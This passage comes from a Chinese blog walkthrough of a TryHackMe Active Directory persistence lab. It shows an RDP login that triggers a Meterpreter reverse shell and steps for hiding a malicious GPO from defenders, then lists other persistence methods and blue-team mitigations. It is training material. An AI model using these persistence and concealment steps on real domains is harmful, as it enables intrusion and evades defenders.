<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101927186.png" alt="image-20240303101927186"></p>
<p>注意：我们需要为上述恶意GPO创建一个Logon(登录)事件，所以我们还需要确保注销我们上文中用于创建恶意GPO的RDP会话，注销过程将如下所示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101951710.png" alt="image-20240303101951710"></p>
<p>现在，让我们使用已经修改了密码的管理员用户身份通过RDP访问thmserver1目标机器，这将触发登录事件：</p>
<pre><code class="hljs scss">xfreerdp /v:thmserver1.za.tryhackme.loc /u:<span class="hljs-string">'t1_eileen.burton'</span> /p:<span class="hljs-string">'Strong.Password123'</span> /cert:ignore +clipboard
#使用我们所设置的新密码进行登录</code></pre>
<p>然后我们将在攻击机上的端口监听器上接收到一个反向shell连接：</p>
<pre><code class="hljs scss">msf5 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; run 
<span class="hljs-selector-attr">[*]</span> Started reverse TCP handler on <span class="hljs-number">10.50</span><span class="hljs-selector-class">.84</span><span class="hljs-selector-class">.147</span>:<span class="hljs-number">4445</span> 

[*] Sending stage (<span class="hljs-number">176195</span> bytes) to <span class="hljs-number">172.31</span>.<span class="hljs-number">1.201</span>
[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.50</span>.<span class="hljs-number">84.147</span>:<span class="hljs-number">4445</span> -&gt; <span class="hljs-number">172.31</span>.<span class="hljs-number">1.201</span>:<span class="hljs-number">63695</span>) at <span class="hljs-number">202</span>x-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">28</span> +<span class="hljs-number">0100</span> 

meterpreter &gt;</code></pre>
<h2 id="隐藏gpo">隐藏GPO</h2>
<p>我们不希望蓝队能够修改或删除我们所创建的恶意GPO，这会破坏我们所建立的持久性权限，因此我们可以在thmwrk1跳板主机上打开MMC控制台，并尝试隐藏我们刚才所创建的GPO。</p>
<pre><code class="hljs scss">xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'chloe.potter'</span> /p:<span class="hljs-string">'Marisa2014'</span> /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard

runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe

mmc.exe</code></pre>
<p>单击“委派”选项卡：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102110784.png" alt="image-20240303102110784"></p>
<p>在默认情况下，所有管理员都可以编辑我们上文所创建的GPO，所以让我们删除这些权限：</p>
<ol>
<li>右键单击<strong>ENTERPRISE DOMAIN CONTROLLERS</strong> (企业域控制器)，然后选择<strong>Edit settings, delete, modify security</strong>；</li>
<li>单击所有其他组(经过身份验证的用户除外)，然后单击删除。</li>
</ol>
<p>最后的委派内容将如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102201228.png" alt="image-20240303102201228"></p>
<p>单击恶意GPO的安全设置中的高级选项并从权限中删除Created Owner：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102210857.png" alt="image-20240303102210857"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102217909.png" alt="image-20240303102217909"></p>
<p>tips：在默认情况下，所有通过身份验证的用户都必须具有读取策略的权限，否则，当AD用户进行身份验证以应用用户策略时，将无法读取策略。如果我们没有部署登录脚本，我们就可以尝试删除此权限，以确保几乎没有人能够读取我们的策略。</p>
<p>接下来，我们可以将Authenticated Users替换成Domain Computers，以确保计算机可以读取和应用我们的恶意策略，但是同时我们还要阻止任何AD用户去读取恶意策略(我们需要提前测试一下反向shell回调能够正常进行，因为我们接下来的操作会使得用户无法读取PowerShell脚本)：</p>
<ol>
<li>在恶意GPO的安全设置中单击添加；</li>
<li>输入<strong>Domain Computers</strong>，然后点击<strong>Check Names</strong>并继续点击<strong>OK</strong>；</li>
<li>选择<strong>Read permissions</strong>并确认；</li>
<li>点击选中<strong>Authenticated Users</strong>并进行删除。</li>
</ol>
<p>执行上次步骤之后，我们将立即收到一个错误提示，告诉我们无法再读取策略：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102231566.png" alt="image-20240303102231566"></p>
<p>通过执行上述操作，我们可以确保蓝队无法轻易删除我们所创建的恶意GPO，除非他们选择模拟域控制器的计算机帐户。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102628989.png" alt="image-20240303102628989"></p>
<h1 id="0x09-总结">0x09 总结</h1>
<p>我们可以通过几种不同的方式来实现域权限维持，其中的一些技术会比其他技术更加具有隐蔽性和有效性。为了确保我们所执行的权限维持设置不会被蓝队移除，我们必须创造性地思考怎么进行权限维持。</p>
<p>此外，我们不应该等到整个目标AD域都被渗透之后再考虑进行权限维持，实际上，在每一轮的横向移动和权限提升操作之后，我们就应该尝试进行域权限维持。</p>
<h2 id="其他域权限维持技术">其他域权限维持技术</h2>
<p>在本文的实验网络环境中，我们介绍了几种可用于在AD域中实现权限维持的技术；但是，我们目前所介绍的权限维持技术绝不是一个详尽的清单。下面是其他一些值得被提及的域权限维持技术：</p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/">Skeleton keys</a></strong>：使用Mimikatz，我们可以部署万能钥匙(skeleton key)，该万能钥匙可用于模拟模板AD域中的任何帐户；Mimikatz会创建一个默认密码，并将其适用于目标AD域中的任何帐户，但是原先的普通密码仍然有效，因此防御者很难知道这种攻击已经发生。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1714">Directory Service Restore Mode (DSRM)</a></strong>：每个域控制器中都有一个被称为DSRM的内部可用的管理员帐户，DSRM帐户的密码将在服务器升级为DC时设置，并且很少会发生修改，该密码能够用于在紧急情况下恢复DC；而攻击者可以使用Mimikatz来提取DSRM帐户的密码，并使用此密码获得针对目标AD环境中的域控制器(DC)的管理及访问权限。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1760">Malicious Security Support Provider (SSP)</a></strong>：利用SSP接口，我们可以将Mimikatz的mimilib添加为新的SSP，这会将目标域中的所有身份验证尝试的凭据都记录到一个日志文件中；我们可以指定用于日志记录的网络位置，这将允许mimilib把我们的凭据发送给被入侵的域内主机并进行身份验证，从而为我们提供持久化的访问权限。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2753">Computer Accounts</a></strong>：机器(计算机)帐户的密码通常会每30天轮换一次，但是，我们可以更改机器帐户的密码设置，让它停止自动轮换；除此之外，我们还可以授予机器帐户对于其他域内主机的管理及访问权限，这将允许我们将计算机帐户作为域内的其他AD帐户使用，我们只需要尝试让该帐户对其他主机也具有管理权限即可，而且这在AD域中通常是正常的行为，因此相关操作可能不会被蓝队认为是恶意行为。</li>
</ul>
<p>我们还应该注意到，本文的重点是AD域中的权限维持技术，而本地权限维持技术仅允许攻击者在目标主机上实现权限持久化，但是如果这些目标主机是在目标AD域内的，那么我们也可以通过本地权限维持来实现针对目标AD域的权限维持。</p>
<h2 id="缓解域权限维持威胁的措施">缓解域权限维持威胁的措施</h2>
<p>蓝队应该如何防御这些针对AD域的权限维持技术呢？在某些情况下，攻击者所执行的权限维持设置可能根深蒂固，以至于蓝队需要重新构建完整的域才能够完全清理权限维持设置；在通常情况下，蓝队可以通过以下操作来检测由攻击者所部署的权限维持设置：</p>
<ul>
<li>检测异常帐户的登录事件，当AD域的分层模型被用户凭据所破坏时，则可能是攻击者使用了域权限维持技术的结果。</li>
<li>对于上文所提到的每一种域权限维持技术，蓝队都可以编写特定的检测规则，例如蓝队可以检测机器帐户的密码更改、被允许更新的ACL、是否创建了新的GPO等。</li>
<li>用于对抗域权限维持的最佳方法是保护特权资源，尽管攻击者可以使用低特权访问权限来部署域权限维持设置，但是真正可怕的域权限维持技术只有在攻击者获得针对目标AD域的高级访问特权后才可以被使用。</li>
</ul>
<p>本文只是一个简单的技术介绍，关于AD域的安全性，我们还有很多地方需要学习。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/')">THM-Persisting Active Directory</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Persisting Active Directory&amp;url=http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">36</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/16/thm-nmap/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Nmap</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/26/qian-xi-xxe-lou-dong-java/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析xxe漏洞-Java</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ad-%E7%BB%B4%E6%8C%81"><span class="toc-number">1.1.</span> <span class="toc-text">AD 维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.3.</span> <span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E5%87%AD%E8%AF%81%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">0x02 通过凭证进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%AD%E5%96%9C%E4%BD%A0"><span class="toc-number">2.1.</span> <span class="toc-text">恭喜你</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dc-sync%E5%90%8C%E6%AD%A5"><span class="toc-number">2.2.</span> <span class="toc-text">DC Sync（同步）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B6%E9%9D%9E%E6%89%80%E6%9C%89%E5%87%AD%E8%AF%81%E9%83%BD%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84"><span class="toc-number">2.3.</span> <span class="toc-text">并非所有凭证都是一样的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dc%E5%90%8C%E6%AD%A5%E5%85%A8%E9%83%A8"><span class="toc-number">2.4.</span> <span class="toc-text">DC同步全部</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E9%80%9A%E8%BF%87%E7%A5%A8%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">0x03 通过票据持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A7%E5%85%8B%E5%8A%9B%E5%B7%A5%E5%8E%82%E9%97%A8%E7%A5%A8"><span class="toc-number">3.1.</span> <span class="toc-text">巧克力工厂门票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.2.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.3.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E9%97%A8%E7%A5%A8%E4%BB%A5%E8%8E%B7%E5%8F%96%E4%B9%90%E8%B6%A3%E5%92%8C%E5%88%A9%E6%B6%A6"><span class="toc-number">3.4.</span> <span class="toc-text">伪造门票以获取乐趣和利润</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">0x04 通过证书进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ad-cs%E5%9B%9E%E5%BD%92"><span class="toc-number">4.1.</span> <span class="toc-text">AD CS回归</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-number">4.2.</span> <span class="toc-text">提取私钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-number">4.3.</span> <span class="toc-text">生成我们自己的证书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%B8%8D%E5%86%8D%E6%98%AF%E8%93%9D%E9%98%9F%E7%9A%84%E6%9C%8B%E5%8F%8B"><span class="toc-number">4.4.</span> <span class="toc-text">我们不再是蓝队的朋友</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E9%80%9A%E8%BF%87-sid-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">0x05 通过 SID 历史记录进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%BB%E9%80%A0%E5%8E%86%E5%8F%B2"><span class="toc-number">5.1.</span> <span class="toc-text">锻造历史</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E7%9A%84%E5%B9%B2%E8%8D%89%E5%8F%89%E5%92%8C%E7%81%AB%E6%8A%8A"><span class="toc-number">5.2.</span> <span class="toc-text">蓝队的干草叉和火把</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E9%80%9A%E8%BF%87%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">6.</span> <span class="toc-text">0x06 通过组成员身份实现持久性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%9B%A2%E4%BD%93%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E5%9D%9A%E6%8C%81%E4%B8%8B%E5%8E%BB"><span class="toc-number">6.1.</span> <span class="toc-text">通过团体成员身份坚持下去</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nested-groups%E5%B5%8C%E5%A5%97%E7%BB%84"><span class="toc-number">6.2.</span> <span class="toc-text">Nested Groups(嵌套组)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B5%8C%E5%A5%97%E7%BB%84%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">6.3.</span> <span class="toc-text">基于嵌套组实现权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%A6%E4%BA%BA%E7%9A%84%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AF%E8%93%9D%E9%98%9F"><span class="toc-number">6.4.</span> <span class="toc-text">烦人的不仅仅是蓝队</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E9%80%9A%E8%BF%87acl%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">0x07 通过ACL进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ad%E7%BB%84%E6%A8%A1%E6%9D%BF"><span class="toc-number">7.1.</span> <span class="toc-text">使用AD组模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8adminsdholder%E5%AE%B9%E5%99%A8%E4%BF%AE%E6%94%B9%E5%85%B6acls%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.2.</span> <span class="toc-text">使用AdminSDHolder容器(修改其ACLs)实现权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%90%AF%E5%8A%A8sdprop%E8%BF%9B%E7%A8%8B"><span class="toc-number">7.3.</span> <span class="toc-text">手动启动SDProp进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E6%AD%A3%E5%9C%A8%E8%B5%B0%E4%B8%8B%E5%9D%A1%E8%B7%AF"><span class="toc-number">7.4.</span> <span class="toc-text">蓝队正在走下坡路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E9%80%9A%E8%BF%87gpo%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">8.</span> <span class="toc-text">0x08 通过GPO实现持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">8.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">8.2.</span> <span class="toc-text">前期准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAgpo"><span class="toc-number">8.3.</span> <span class="toc-text">创建GPO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8Fgpo"><span class="toc-number">8.4.</span> <span class="toc-text">隐藏GPO</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E6%80%BB%E7%BB%93"><span class="toc-number">9.</span> <span class="toc-text">0x09 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 